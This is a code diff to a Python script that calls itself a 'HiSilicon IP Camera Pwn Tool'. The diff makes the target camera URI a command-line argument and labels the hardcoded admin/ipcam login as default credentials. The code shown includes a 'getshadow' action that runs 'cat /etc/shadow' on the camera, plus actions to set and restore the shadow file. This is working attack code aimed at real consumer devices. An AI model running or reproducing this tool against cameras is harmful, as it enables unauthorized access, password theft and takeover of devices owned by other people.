@@ -12,8 +12,8 @@ from tqdm import trange
 from struct import pack, unpack
 from base64 import b64decode, b64encode
 
+# default creds
 auth = ("admin", "ipcam")
-URI = 'http://192.168.55.42:443'
 
 wifi_conf = """WifiEnable=0
 WifiType=Infra
@@ -96,9 +96,12 @@ def upload_conf(bindata):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='HiSilicon IP Camera Pwn Tool')
+    parser.add_argument('uri', nargs=1, help='ipcam http uri (e.g. http://192.168.0.12:443)')
     parser.add_argument('action', nargs=1, help='action to perform: getshadow, setshadow, restoreshadow')
     args = parser.parse_args()
 
+    URI = args.uri[0]
+    
     if args.action[0] == 'getshadow':
         cmd = "cat /etc/shadow > /mnt/mtd/ipc/tmpfs/t.txt"
         vrfydata = get_vrfydata()
